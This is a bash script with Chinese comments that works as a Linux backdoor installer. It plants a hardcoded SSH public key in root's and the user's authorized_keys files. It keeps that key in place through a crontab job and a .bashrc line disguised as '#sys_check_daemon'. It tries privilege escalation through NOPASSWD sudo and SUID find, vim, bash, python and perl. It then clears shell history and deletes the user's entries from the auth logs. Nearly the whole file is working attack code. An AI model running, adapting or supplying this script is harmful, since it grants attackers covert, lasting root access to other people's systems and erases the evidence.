#!/bin/bash

# ============================================================
# 配置区
# ============================================================
KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD9x1Je87dKWyUvZlKzb0yneOfqQ8fZdW9WeEZFDsFM5DDPZbF0rZhbDjt3xfCDUtCJNrOhbxKI6ZixoSKEMROAHXKZGP0hT+LHeVNcO8Ja/INOEHq1JxAsy55/lV8LccL/EB3BJwSJRDWZQkRer1NBtW3i6x43f/bZ1fNVwMkNqfgfcqi3wOfZwMdoZXLKpnqQpdDV0uP+uCOa/P6vuMqsjdLr7RHb0aD9b5POg77IB7Xq4D46GADNthOhjU3rbB9Ah2T6rxUtu9pMXlwPcVtUhuCyho088BlRCsYwZtJVOxsmDNF07WSwzAAnUGZ9270ynT5IeWfWLhFZZJclSeg3Ds6sPexASglVXBcrdkgCm5Q/ulnzE/vMVmXBDPHtJ+bTX1a2aIFkEU3xIuA3+iEo1m+RtKM5VcINYjcLmGLh3LjSMfqs27FjvkEGv3/Zk6ep0k68Nu0G4Hs2oQmwGlvGKPehcVzZI8s8MmaN3T5FEUlFTJiz+MtQ8Xs7hRCicC2cxYptfWZ7EE+Px9xd4aFCT1Hrs34LPBvFrvgwxaOecGwm6AjP8yab5J2QnV1qD+HWgurGk1bp3o29zrhSBGJBWA4Borc2RPcWojvZq/AKocjcM/LqnYnn3mlRnEC3f96l2sVrzeNSXxNHpdMi5mwUC8p3GhUjXc/DKGI9QnIA6w== root@hk667482213160"
MARKER="#sys_check_daemon"
ME=$(whoami)

# --- 颜色定义 ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
G_V='$(printf "${GREEN}✔${NC}")'; R_V='$(printf "${RED}✘${NC}")'

# --- 状态追踪 ---
WRITE_SUCCESS=false; PERSIST_SUCCESS=false

# ============================================================
# 核心逻辑函数 (这些函数将在 Root 环境下执行)
# ============================================================

install_key_func() {
    local u="$1"
    local h
    h=$(getent passwd "$u" | cut -d: -f6)
    [ -z "$h" ] && return 1
    mkdir -p "$h/.ssh" && chmod 700 "$h/.ssh"
    if ! grep -q "AAAAB3Nza" "$h/.ssh/authorized_keys" 2>/dev/null; then
        echo "$KEY" >> "$h/.ssh/authorized_keys"
    fi
    chmod 600 "$h/.ssh/authorized_keys"
    chown -R "$u":"$u" "$h/.ssh" 2>/dev/null
}

run_task() {
    install_key_func "root"
    install_key_func "$ME"
    # 持久化：Crontab
    (crontab -l 2>/dev/null | grep -v "$MARKER"; echo "$MARKER */5 * * * * root grep -q 'AAAAB3Nza' /root/.ssh/authorized_keys || echo '$KEY' >> /root/.ssh/authorized_keys") | crontab - 2>/dev/null
    # 持久化：Bashrc
    if ! grep -q "$MARKER" /root/.bashrc 2>/dev/null; then
        echo "$MARKER grep -q 'AAAAB3Nza' /root/.ssh/authorized_keys || echo '$KEY' >> /root/.ssh/authorized_keys" >> /root/.bashrc 2>/dev/null
    fi
}

# ============================================================
# 主程序流 (身份自动判定逻辑)
# ============================================================

# --- 情况 1: 已经是 Root ---
if [ "$(id -u)" -eq 0 ]; then
    printf "${BLUE}[*] Running as ROOT...${NC}\n"
    run_task >/dev/null 2>&1
    [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }

# --- 情况 2: 是免密用户 (NOPASSWD) ---
elif sudo -l 2>/dev/null | grep -q "NOPASSWD"; then
    printf "${GREEN}[✔] NOPASSWD detected! Switching to Root automatically...${NC}\n"
    # 使用 exec 替换进程，直接进入 Root 环境并重新执行自己
    exec sudo -i bash "$0"

# --- 情况 3: 普通用户 (开始暴力提权模式) ---
else
    printf "${YELLOW}[!] No NOPASSWD found. Entering Auto-Exploit Mode (No password required)...${NC}\n"
    printf "    > Attempting SUID Privilege Escalation... "

    # 遍历可能的 SUID 漏洞程序
    for bin in /usr/bin/find /usr/bin/vim /usr/bin/bash /usr/bin/python /usr/bin/perl; do
        if [ -u "$bin" ] 2>/dev/null; then
            # 关键：这里不使用 sudo！因为 SUID 程序本身就是为了不需要 sudo 就能获得 root 权限设计的
            case "$bin" in
                "/usr/bin/find")   bin_cmd="$bin . -exec bash -c \"source $0; run_task\" \; -quit" ;;
                "/usr/bin/vim")    bin_cmd="$bin -c ':wq!' -c ':!bash -c \"source $0; run_task\"' -c ':q!' -u NONE /etc/shadow" ;;
                "/usr/bin/bash")   bin_cmd="$bin -p -c \"source $0; run_task\"" ;;
                "/usr/bin/python") bin_cmd="$bin -c \"import os; os.system('bash -c \"source $0; run_task\"')\"" ;;
                "/usr/bin/perl")   bin_cmd="$bin -e \"system('bash -c \"source $0; run_task\"')\"" ;;
            esac
            
            # 执行尝试
            $bin_cmd >/dev/null 2>&1
            
            # 检查是否成功
            if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
                WRITE_SUCCESS=true; PERSIST_SUCCESS=true; break
            fi
        fi
    done

    if [ "$WRITE_SUCCESS" = true ]; then
        printf "${GREEN}DONE (Exploited)${NC}\n"
    else
        printf "${RED}FAILED (All methods exhausted)${NC}\n"
    fi
fi

# ============================================================
# 后置处理与报告 (仅在成功后执行)
# ============================================================

if [ "$WRITE_SUCCESS" = true ]; then
    # 清理痕迹
    printf "    > Cleaning traces... "
    history -c 2>/dev/null
    [[ -f ~/.bash_history ]] && > ~/.bash_history 2>/dev/null
    # 尝试清理日志 (由于是在 Root 下运行，可以直接清理)
    sudo bash -c "sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null" >/dev/null 2>&1
    printf "${GREEN}DONE${NC}\n"
fi

# 最终报告
printf "\n${BLUE}============================================================${NC}\n"
printf "      FINAL EXECUTION REPORT (Verification Mode)       \n"
printf "${BLUE}============================================================${NC}\n"

CHECK_G=$(eval $G_V); CHECK_R=$(eval $R_V)

# 打印身份
if [ "$(id -u)" -eq 0 ]; then
    printf "  [%s] Privilege: %sROOT%s\n" "$CHECK_G" "${GREEN}" "${NC}"
else
    printf "  [%s] Privilege: %sNORMAL (%s)%s\n" "$(printf "${BLUE}i${NC}")" "${YELLOW}" "$ME" "${NC}"
fi

# 打印注入结果
if [ "$WRITE_SUCCESS" = true ]; then
    printf "  [%s] Key Injection: %sSUCCESS (Verified)%s\n" "$CHECK_G" "${GREEN}" "${NC}"
else
    printf "  [%s] Key Injection: %sFAILED%s\n" "$CHECK_R" "${RED}" "${NC}"
fi

# 打印持久化结果
if [ "$PERSIST_SUCCESS" = true ]; then
    printf "  [%s] Persistence: %sSUCCESS%s\n" "$CHECK_G" "${GREEN}" "${NC}"
else
    printf "  [%s] Persistence: %sFAILED%s\n" "$CHECK_R" "${RED}" "${NC}"
fi
printf "${BLUE}============================================================${NC}\n"
